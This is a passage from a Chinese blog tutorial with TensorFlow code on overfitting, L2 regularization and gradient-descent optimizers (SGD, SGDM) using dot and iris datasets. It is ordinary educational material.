<span class="number">0.005</span>  <span class="comment"># 学习率</span></span><br><span class="line">epoch = <span class="number">800</span>  <span class="comment"># 循环轮数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练部分</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epoch):</span><br><span class="line">    <span class="keyword">for</span> step, (x_train, y_train) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_db):</span><br><span class="line">        <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># 记录梯度信息</span></span><br><span class="line"></span><br><span class="line">            h1 = tf.matmul(x_train, w1) + b1  <span class="comment"># 记录神经网络乘加运算</span></span><br><span class="line">            h1 = tf.nn.relu(h1)</span><br><span class="line">            y = tf.matmul(h1, w2) + b2</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 采用均方误差损失函数mse = mean(sum(y-out)^2)</span></span><br><span class="line">            loss = tf.reduce_mean(tf.square(y_train - y))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算loss对各个参数的梯度</span></span><br><span class="line">        variables = [w1, b1, w2, b2]</span><br><span class="line">        grads = tape.gradient(loss, variables)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 实现梯度更新</span></span><br><span class="line">        <span class="comment"># w1 = w1 - lr * w1_grad tape.gradient是自动求导结果与[w1, b1, w2, b2] 索引为0，1，2，3 </span></span><br><span class="line">        w1.assign_sub(lr * grads[<span class="number">0</span>])</span><br><span class="line">        b1.assign_sub(lr * grads[<span class="number">1</span>])</span><br><span class="line">        w2.assign_sub(lr * grads[<span class="number">2</span>])</span><br><span class="line">        b2.assign_sub(lr * grads[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每20个epoch，打印loss信息</span></span><br><span class="line">    <span class="keyword">if</span> epoch % <span class="number">20</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;epoch:&#x27;</span>, epoch, <span class="string">&#x27;loss:&#x27;</span>, <span class="built_in">float</span>(loss))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预测部分</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*******predict*******&quot;</span>)</span><br><span class="line"><span class="comment"># xx在-3到3之间以步长为0.01，yy在-3到3之间以步长0.01,生成间隔数值点</span></span><br><span class="line">xx, yy = np.mgrid[-<span class="number">3</span>:<span class="number">3</span>:<span class="number">.1</span>, -<span class="number">3</span>:<span class="number">3</span>:<span class="number">.1</span>]</span><br><span class="line"><span class="comment"># 将xx , yy拉直，并合并配对为二维张量，生成二维坐标点</span></span><br><span class="line">grid = np.c_[xx.ravel(), yy.ravel()]</span><br><span class="line">grid = tf.cast(grid, tf.float32)</span><br><span class="line"><span class="comment"># 将网格坐标点喂入神经网络，进行预测，probs为输出</span></span><br><span class="line">probs = []</span><br><span class="line"><span class="keyword">for</span> x_test <span class="keyword">in</span> grid:</span><br><span class="line">    <span class="comment"># 使用训练好的参数进行预测</span></span><br><span class="line">    h1 = tf.matmul([x_test], w1) + b1</span><br><span class="line">    h1 = tf.nn.relu(h1)</span><br><span class="line">    y = tf.matmul(h1, w2) + b2  <span class="comment"># y为预测结果</span></span><br><span class="line">    probs.append(y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取第0列给x1，取第1列给x2</span></span><br><span class="line">x1 = x_data[:, <span class="number">0</span>]</span><br><span class="line">x2 = x_data[:, <span class="number">1</span>]</span><br><span class="line"><span class="comment"># probs的shape调整成xx的样子</span></span><br><span class="line">probs = np.array(probs).reshape(xx.shape)</span><br><span class="line">plt.scatter(x1, x2, color=np.squeeze(Y_c))  <span class="comment"># squeeze去掉纬度是1的纬度,相当于去掉[[&#x27;red&#x27;],[&#x27;&#x27;blue]],内层括号变为[&#x27;red&#x27;,&#x27;blue&#x27;]</span></span><br><span class="line"><span class="comment"># 把坐标xx yy和对应的值probs放入contour函数，给probs值为0.5的所有点上色  plt.show()后 显示的是红蓝点的分界线</span></span><br><span class="line">plt.contour(xx, yy, probs, levels=[<span class="number">.5</span>])</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读入红蓝点，画出分割线，不包含正则化</span></span><br><span class="line"><span class="comment"># 不清楚的数据，建议print出来查看</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>运行结果</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642651380285.png" alt="result"></p>
<p>可见，这种情况属于过拟合。</p>
<blockquote>
<p>使用L2正则化缓解过拟合</p>
</blockquote>
<p><strong>代码示例</strong>：<br>注：与上大体一致，只是增加了L2正则化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入所需模块</span></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读入数据/标签 生成x_train y_train</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;dot.csv&#x27;</span>)</span><br><span class="line">x_data = np.array(df[[<span class="string">&#x27;x1&#x27;</span>, <span class="string">&#x27;x2&#x27;</span>]])</span><br><span class="line">y_data = np.array(df[<span class="string">&#x27;y_c&#x27;</span>])</span><br><span class="line"></span><br><span class="line">x_train = x_data</span><br><span class="line">y_train = y_data.reshape(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Y_c = [[<span class="string">&#x27;red&#x27;</span> <span class="keyword">if</span> y <span class="keyword">else</span> <span class="string">&#x27;blue&#x27;</span>] <span class="keyword">for</span> y <span class="keyword">in</span> y_train]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换x的数据类型，否则后面矩阵相乘时会因数据类型问题报错</span></span><br><span class="line">x_train = tf.cast(x_train, tf.float32)</span><br><span class="line">y_train = tf.cast(y_train, tf.float32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># from_tensor_slices函数切分传入的张量的第一个维度，生成相应的数据集，使输入特征和标签值一一对应</span></span><br><span class="line">train_db = tf.data.Dataset.from_tensor_slices((x_train, y_train)).batch(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成神经网络的参数，输入层为4个神经元，隐藏层为32个神经元，2层隐藏层，输出层为3个神经元</span></span><br><span class="line"><span class="comment"># 用tf.Variable()保证参数可训练</span></span><br><span class="line">w1 = tf.Variable(tf.random.normal([<span class="number">2</span>, <span class="number">11</span>]), dtype=tf.float32)</span><br><span class="line">b1 = tf.Variable(tf.constant(<span class="number">0.01</span>, shape=[<span class="number">11</span>]))</span><br><span class="line"></span><br><span class="line">w2 = tf.Variable(tf.random.normal([<span class="number">11</span>, <span class="number">1</span>]), dtype=tf.float32)</span><br><span class="line">b2 = tf.Variable(tf.constant(<span class="number">0.01</span>, shape=[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">lr = <span class="number">0.005</span>  <span class="comment"># 学习率为</span></span><br><span class="line">epoch = <span class="number">800</span>  <span class="comment"># 循环轮数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练部分</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epoch):</span><br><span class="line">    <span class="keyword">for</span> step, (x_train, y_train) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_db):</span><br><span class="line">        <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># 记录梯度信息</span></span><br><span class="line"></span><br><span class="line">            h1 = tf.matmul(x_train, w1) + b1  <span class="comment"># 记录神经网络乘加运算</span></span><br><span class="line">            h1 = tf.nn.relu(h1)</span><br><span class="line">            y = tf.matmul(h1, w2) + b2</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 采用均方误差损失函数mse = mean(sum(y-out)^2)</span></span><br><span class="line">            loss_mse = tf.reduce_mean(tf.square(y_train - y))</span><br><span class="line">            <span class="comment"># 添加l2正则化</span></span><br><span class="line">            loss_regularization = []</span><br><span class="line">            <span class="comment"># tf.nn.l2_loss(w)=sum(w ** 2) / 2</span></span><br><span class="line">            loss_regularization.append(tf.nn.l2_loss(w1))</span><br><span class="line">            loss_regularization.append(tf.nn.l2_loss(w2))</span><br><span class="line">            <span class="comment"># 求和</span></span><br><span class="line">            <span class="comment"># 例：x=tf.constant(([1,1,1],[1,1,1]))</span></span><br><span class="line">            <span class="comment">#   tf.reduce_sum(x)</span></span><br><span class="line">            <span class="comment"># &gt;&gt;&gt;6</span></span><br><span class="line">            loss_regularization = tf.reduce_sum(loss_regularization)</span><br><span class="line">            loss = loss_mse + <span class="number">0.03</span> * loss_regularization  <span class="comment"># REGULARIZER = 0.03</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算loss对各个参数的梯度</span></span><br><span class="line">        variables = [w1, b1, w2, b2]</span><br><span class="line">        grads = tape.gradient(loss, variables)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 实现梯度更新</span></span><br><span class="line">        <span class="comment"># w1 = w1 - lr * w1_grad</span></span><br><span class="line">        w1.assign_sub(lr * grads[<span class="number">0</span>])</span><br><span class="line">        b1.assign_sub(lr * grads[<span class="number">1</span>])</span><br><span class="line">        w2.assign_sub(lr * grads[<span class="number">2</span>])</span><br><span class="line">        b2.assign_sub(lr * grads[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每200个epoch，打印loss信息</span></span><br><span class="line">    <span class="keyword">if</span> epoch % <span class="number">20</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;epoch:&#x27;</span>, epoch, <span class="string">&#x27;loss:&#x27;</span>, <span class="built_in">float</span>(loss))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预测部分</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*******predict*******&quot;</span>)</span><br><span class="line"><span class="comment"># xx在-3到3之间以步长为0.01，yy在-3到3之间以步长0.01,生成间隔数值点</span></span><br><span class="line">xx, yy = np.mgrid[-<span class="number">3</span>:<span class="number">3</span>:<span class="number">.1</span>, -<span class="number">3</span>:<span class="number">3</span>:<span class="number">.1</span>]</span><br><span class="line"><span class="comment"># 将xx, yy拉直，并合并配对为二维张量，生成二维坐标点</span></span><br><span class="line">grid = np.c_[xx.ravel(), yy.ravel()]</span><br><span class="line">grid = tf.cast(grid, tf.float32)</span><br><span class="line"><span class="comment"># 将网格坐标点喂入神经网络，进行预测，probs为输出</span></span><br><span class="line">probs = []</span><br><span class="line"><span class="keyword">for</span> x_predict <span class="keyword">in</span> grid:</span><br><span class="line">    <span class="comment"># 使用训练好的参数进行预测</span></span><br><span class="line">    h1 = tf.matmul([x_predict], w1) + b1</span><br><span class="line">    h1 = tf.nn.relu(h1)</span><br><span class="line">    y = tf.matmul(h1, w2) + b2  <span class="comment"># y为预测结果</span></span><br><span class="line">    probs.append(y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取第0列给x1，取第1列给x2</span></span><br><span class="line">x1 = x_data[:, <span class="number">0</span>]</span><br><span class="line">x2 = x_data[:, <span class="number">1</span>]</span><br><span class="line"><span class="comment"># probs的shape调整成xx的样子</span></span><br><span class="line">probs = np.array(probs).reshape(xx.shape)</span><br><span class="line">plt.scatter(x1, x2, color=np.squeeze(Y_c))</span><br><span class="line"><span class="comment"># 把坐标xx yy和对应的值probs放入contour函数，给probs值为0.5的所有点上色  plt.show()后 显示的是红蓝点的分界线</span></span><br><span class="line">plt.contour(xx, yy, probs, levels=[<span class="number">.5</span>])</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读入红蓝点，画出分割线，包含正则化</span></span><br><span class="line"><span class="comment"># 不清楚的数据，建议print出来查看</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：</p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642652095990.png" alt="result"></p>
<p>经过L2正则化后得到正确拟合。</p>
<h1 id="神经网络参数优化器"><a href="#神经网络参数优化器" class="headerlink" title="神经网络参数优化器"></a>神经网络参数优化器</h1><blockquote>
<p>所谓神经网络优化器就是参数的更新方法。</p>
</blockquote>
<p>优化算法可以分成一阶优化和二阶优化算法，其中一阶优化就是指的梯度算法及其变种，而二阶优化一般是用二阶导数（Hessian 矩阵）来计算，如牛顿法，由于需要计算Hessian阵和其逆矩阵，计算量较大，因此没有流行开来。这里主要总结<strong>一阶优化</strong>的各种梯度下降方法。</p>
<p>深度学习优化算法经历了<code>SGD </code>-&gt; <code>SGDM </code>-&gt;<code> NAG</code> -&gt;<code>AdaGrad </code>-&gt; <code>AdaDelta</code> -&gt; <code>Adam</code> -&gt; <code>Nadam</code>这样的发展历程。</p>
<h2 id="认识变量"><a href="#认识变量" class="headerlink" title="认识变量"></a>认识变量</h2><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642663993435.png" alt="变量"></p>
<p>从上图可以看到神经网络参数的更新公式。下面我们介绍的五种优化方法都是依据上述公式，只是<strong>mt和vt</strong>定义的数据不同。接下来我们简要介绍一下这5中优化算法。（只是进行一下简要介绍，更加具体的内容留待以后）</p>
<h2 id="SGD方法"><a href="#SGD方法" class="headerlink" title="SGD方法"></a>SGD方法</h2><blockquote>
<p>无momentum,常用的梯度下降法</p>
</blockquote>
<p><strong>求解流程</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642664399111.png" alt="SGD"></p>
<p><strong>核心代码</strong>：<br><code> w1.assign_sub(lr * grads[0])  # 参数w1自更新</code><br><code> b1.assign_sub(lr * grads[1])  # 参数b自更新</code></p>
<p><strong>代码实例</strong>：（以前面的鸢尾花的数据集为例）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用鸢尾花数据集，实现前向传播、反向传播，可视化loss曲线</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入所需模块</span></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time  <span class="comment">##1##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入数据，分别为输入特征和标签</span></span><br><span class="line">x_data = datasets.load_iris().data</span><br><span class="line">y_data = datasets.load_iris().target</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机打乱数据（因为原始数据是顺序的，顺序不打乱会影响准确率）</span></span><br><span class="line"><span class="comment"># seed: 随机数种子，是一个整数，当设置之后，每次生成的随机数都一样（为方便教学，以保每位同学结果一致）</span></span><br><span class="line">np.random.seed(<span class="number">116</span>)  <span class="comment"># 使用相同的seed，保证输入特征和标签一一对应</span></span><br><span class="line">np.random.shuffle(x_data)</span><br><span class="line">np.random.seed(<span class="number">116</span>)</span><br><span class="line">np.random.shuffle(y_data)</span><br><span class="line">tf.random.set_seed(<span class="number">116</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将打乱后的数据集分割为训练集和测试集，训练集为前120行，测试集为后30行</span></span><br><span class="line">x_train = x_data[:-<span class="number">30</span>]</span><br><span class="line">y_train = y_data[:-<span class="number">30</span>]</span><br><span class="line">x_test = x_data[-<span class="number">30</span>:]</span><br><span class="line">y_test = y_data[-<span class="number">30</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换x的数据类型，否则后面矩阵相乘时会因数据类型不一致报错</span></span><br><span class="line">x_train = tf.cast(x_train, tf.float32)</span><br><span class="line">x_test = tf.cast(x_test, tf.float32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># from_tensor_slices函数使输入特征和标签值一一对应。（把数据集分批次，每个批次batch组数据）</span></span><br><span class="line">train_db = tf.data.Dataset.from_tensor_slices((x_train, y_train)).batch(<span class="number">32</span>)</span><br><span class="line">test_db = tf.data.Dataset.from_tensor_slices((x_test, y_test)).batch(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成神经网络的参数，4个输入特征故，输入层为4个输入节点；因为3分类，故输出层为3个神经元</span></span><br><span class="line"><span class="comment"># 用tf.Variable()标记参数可训练</span></span><br><span class="line"><span class="comment"># 使用seed使每次生成的随机数相同（方便教学，使大家结果都一致，在现实使用时不写seed）</span></span><br><span class="line">w1 = tf.Variable(tf.random.truncated_normal([<span class="number">4</span>, <span class="number">3</span>], stddev=<span class="number">0.1</span>, seed=<span class="number">1</span>))</span><br><span class="line">b1 = tf.Variable(tf.random.truncated_normal([<span class="number">3</span>], stddev=<span class="number">0.1</span>, seed=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">lr = <span class="number">0.1</span>  <span class="comment"># 学习率为0.1</span></span><br><span class="line">train_loss_results = []  <span class="comment"># 将每轮的loss记录在此列表中，为后续画loss曲线提供数据</span></span><br><span class="line">test_acc = []  <span class="comment"># 将每轮的acc记录在此列表中，为后续画acc曲线提供数据</span></span><br><span class="line">epoch = <span class="number">500</span>  <span class="comment"># 循环500轮</span></span><br><span class="line">loss_all = <span class="number">0</span>  <span class="comment"># 每轮分4个step，loss_all记录四个step生成的4个loss的和</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练部分</span></span><br><span class="line">now_time = time.time()  <span class="comment">##2##</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epoch):  <span class="comment"># 数据集级别的循环，每个epoch循环一次数据集</span></span><br><span class="line">    <span class="keyword">for</span> step, (x_train, y_train) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_db):  <span class="comment"># batch级别的循环 ，每个step循环一个batch</span></span><br><span class="line">        <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># with结构记录梯度信息</span></span><br><span class="line">            y = tf.matmul(x_train, w1) + b1  <span class="comment"># 神经网络乘加运算</span></span><br><span class="line">            y = tf.nn.softmax(y)  <span class="comment"># 使输出y符合概率分布（此操作后与独热码同量级，可相减求loss）</span></span><br><span class="line">            y_ = tf.one_hot(y_train, depth=<span class="number">3</span>)  <span class="comment"># 将标签值转换为独热码格式，方便计算loss和accuracy</span></span><br><span class="line">            loss = tf.reduce_mean(tf.square(y_ - y))  <span class="comment"># 采用均方误差损失函数mse = mean(sum(y-out)^2)</span></span><br><span class="line">            loss_all += loss.numpy()  <span class="comment"># 将每个step计算出的loss累加，为后续求loss平均值提供数据，这样计算的loss更准确</span></span><br><span class="line">        <span class="comment"># 计算loss对各个参数的梯度</span></span><br><span class="line">        grads = tape.gradient(loss, [w1, b1])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 实现梯度更新 w1 = w1 - lr * w1_grad    b = b - lr * b_grad</span></span><br><span class="line">        w1.assign_sub(lr * grads[<span class="number">0</span>])  <span class="comment"># 参数w1自更新</span></span><br><span class="line">        b1.assign_sub(lr * grads[<span class="number">1</span>])  <span class="comment"># 参数b自更新</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每个epoch，打印loss信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Epoch &#123;&#125;, loss: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(epoch, loss_all / <span class="number">4</span>))</span><br><span class="line">    train_loss_results.append(loss_all / <span class="number">4</span>)  <span class="comment"># 将4个step的loss求平均记录在此变量中</span></span><br><span class="line">    loss_all = <span class="number">0</span>  <span class="comment"># loss_all归零，为记录下一个epoch的loss做准备</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试部分</span></span><br><span class="line">    <span class="comment"># total_correct为预测对的样本个数, total_number为测试的总样本数，将这两个变量都初始化为0</span></span><br><span class="line">    total_correct, total_number = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x_test, y_test <span class="keyword">in</span> test_db:</span><br><span class="line">        <span class="comment"># 使用更新后的参数进行预测</span></span><br><span class="line">        y = tf.matmul(x_test, w1) + b1</span><br><span class="line">        y = tf.nn.softmax(y)</span><br><span class="line">        pred = tf.argmax(y, axis=<span class="number">1</span>)  <span class="comment"># 返回y中最大值的索引，即预测的分类</span></span><br><span class="line">        <span class="comment"># 将pred转换为y_test的数据类型</span></span><br><span class="line">        pred = tf.cast(pred, dtype=y_test.dtype)</span><br><span class="line">        <span class="comment"># 若分类正确，则correct=1，否则为0，将bool型的结果转换为int型</span></span><br><span class="line">        correct = tf.cast(tf.equal(pred, y_test), dtype=tf.int32)</span><br><span class="line">        <span class="comment"># 将每个batch的correct数加起来</span></span><br><span class="line">        correct = tf.reduce_sum(correct)</span><br><span class="line">        <span class="comment"># 将所有batch中的correct数加起来</span></span><br><span class="line">        total_correct += <span class="built_in">int</span>(correct)</span><br><span class="line">        <span class="comment"># total_number为测试的总样本数，也就是x_test的行数，shape[0]返回变量的行数</span></span><br><span class="line">        total_number += x_test.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 总的准确率等于total_correct/total_number</span></span><br><span class="line">    acc = total_correct / total_number</span><br><span class="line">    test_acc.append(acc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Test_acc:&quot;</span>, acc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------&quot;</span>)</span><br><span class="line">total_time = time.time() - now_time  <span class="comment">##3##</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;total_time&quot;</span>, total_time)  <span class="comment">##4##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 loss 曲线</span></span><br><span class="line">plt.title(<span class="string">&#x27;Loss Function Curve&#x27;</span>)  <span class="comment"># 图片标题</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Epoch&#x27;</span>)  <span class="comment"># x轴变量名称</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Loss&#x27;</span>)  <span class="comment"># y轴变量名称</span></span><br><span class="line">plt.plot(train_loss_results, label=<span class="string">&quot;$Loss$&quot;</span>)  <span class="comment"># 逐点画出trian_loss_results值并连线，连线图标是Loss</span></span><br><span class="line">plt.legend()  <span class="comment"># 画出曲线图标</span></span><br><span class="line">plt.show()  <span class="comment"># 画出图像</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 Accuracy 曲线</span></span><br><span class="line">plt.title(<span class="string">&#x27;Acc Curve&#x27;</span>)  <span class="comment"># 图片标题</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Epoch&#x27;</span>)  <span class="comment"># x轴变量名称</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Acc&#x27;</span>)  <span class="comment"># y轴变量名称</span></span><br><span class="line">plt.plot(test_acc, label=<span class="string">&quot;$Accuracy$&quot;</span>)  <span class="comment"># 逐点画出test_acc值并连线，连线图标是Accuracy</span></span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本文件较 class1\p45_iris.py 仅添加四处时间记录  用 ##n## 标识</span></span><br><span class="line"><span class="comment"># 请将loss曲线、ACC曲线、total_time记录到 class2\优化器对比.docx  对比各优化器收敛情况</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：<br>（包括Loss、Acc图像和训练时间）</p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642664538006.png" alt="SGD-Loss"></p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642664562004.png" alt="SGD-Acc"></p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642664595163.png" alt="SGD-Time"></p>
<h2 id="SGDM"><a href="#SGDM" class="headerlink" title="SGDM"></a>SGDM</h2><blockquote>
<p>含momentum的SGD，在SGD基础上增加一阶动量。</p>
<blockquote>
<p>一阶动量就是指梯度的函数</p>
</blockquote>
</blockquote>
<p><strong>求解流程</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642664792189.png" alt="SGDM"></p>
<p><strong>核心代码</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 初始变量的设置</span><br><span class="line">m_w, m_b = 0, 0</span><br><span class="line">beta = 0.9</span><br><span class="line"></span><br><span class="line"># grad[0]和grad[1]分别为loss关于w和b的导数。</span><br><span class="line">m_w = beta * m_w + (1 - beta) * grads[0]</span><br><span class="line">m_b = beta * m_b + (1 - beta) * grads[1]</span><br><span class="line">w1.assign_sub(lr * m_w)</span><br><span class="line">b1.assign_sub(lr * m_b)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>代码实例</strong>：<br>（将核心代码带入鸢尾花代码）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用鸢尾花数据集，实现前向传播、反向传播，可视化loss曲线</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入所需模块</span></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time  <span class="comment">##1##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入数据，分别为输入特征和标签</span></span><br><span class="line">x_data = datasets.load_iris().data</span><br><span class="line">y_data = datasets.load_iris().target</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机打乱数据（因为原始数据是顺序的，顺序不打乱会影响准确率）</span></span><br><span class="line"><span class="comment"># seed: 随机数种子，是一个整数，当设置之后，每次生成的随机数都一样（为方便教学，以保每位同学结果一致）</span></span><br><span class="line">np.random.seed(<span class="number">116</span>)  <span class="comment"># 使用相同的seed，保证输入特征和标签一一对应</span></span><br><span class="line">np.random.shuffle(x_data)</span><br><span class="line">np.random.seed(<span class="number">116</span>)</span><br><span class="line">np.random.shuffle(y_data)</span><br><span class="line">tf.random.set_seed(<span class="number">116</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将打乱后的数据集分割为训练集和测试集，训练集为前120行，测试集为后30行</span></span><br><span class="line">x_train = x_data[:-<span class="number">30</span>]</span><br><span class="line">y_train = y_data[:-<span class="number">30</span>]</span><br><span class="line">x_test = x_data[-<span class="number">30</span>:]</span><br><span class="line">y_test = y_data[-<span class="number">30</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换x的数据类型，否则后面矩阵相乘时会因数据类型不一致报错</span></span><br><span class="line">x_train = tf.cast(x_train, tf.float32)</span><br><span class="line">x_test = tf.cast(x_test, tf.float32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># from_tensor_slices函数使输入特征和标签值一一对应。（把数据集分批次，每个批次batch组数据）</span></span><br><span class="line">train_db = tf.data.Dataset.from_tensor_slices((x_train, y_train)).batch(<span class="number">32</span>)</span><br><span class="line">test_db = tf.data.Dataset.from_tensor_slices((x_test, y_test)).batch(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成神经网络的参数，4个输入特征故，输入层为4个输入节点；因为3分类，故输出层为3个神经元</span></span><br><span class="line"><span class="comment"># 用tf.Variable()标记参数可训练</span></span><br><span class="line"><span class="comment"># 使用seed使每次生成的随机数相同（方便教学，使大家结果都一致，在现实使用时不写seed）</span></span><br><span class="line">w1 = tf.Variable(tf.random.truncated_normal([<span class="number">4</span>, <span class="number">3</span>], stddev=<span class="number">0.1</span>, seed=<span class="number">1</span>))</span><br><span class="line">b1 = tf.Variable(tf.random.truncated_normal([<span class="number">3</span>], stddev=<span class="number">0.1</span>, seed=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">lr = <span class="number">0.1</span>  <span class="comment"># 学习率为0.1</span></span><br><span class="line">train_loss_results = []  <span class="comment"># 将每轮的loss记录在此列表中，为后续画loss曲线提供数据</span></span><br><span class="line">test_acc = []  <span class="comment"># 将每轮的acc记录在此列表中，为后续画acc曲线提供数据</span></span><br><span class="line">epoch = <span class="number">500</span>  <span class="comment"># 循环500轮</span></span><br><span class="line">loss_all = <span class="number">0</span>  <span class="comment"># 每轮分4个step，loss_all记录四个step生成的4个loss的和</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##########################################################################</span></span><br><span class="line">m_w, m_b = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">beta = <span class="number">0.9</span></span><br><span class="line"><span class="comment">##########################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练部分</span></span><br><span class="line">now_time = time.time()  <span class="comment">##2##</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epoch):  <span class="comment"># 数据集级别的循环，每个epoch循环一次数据集</span></span><br><span class="line">    <span class="keyword">for</span> step, (x_train, y_train) <span class="keyword">in</span> <span 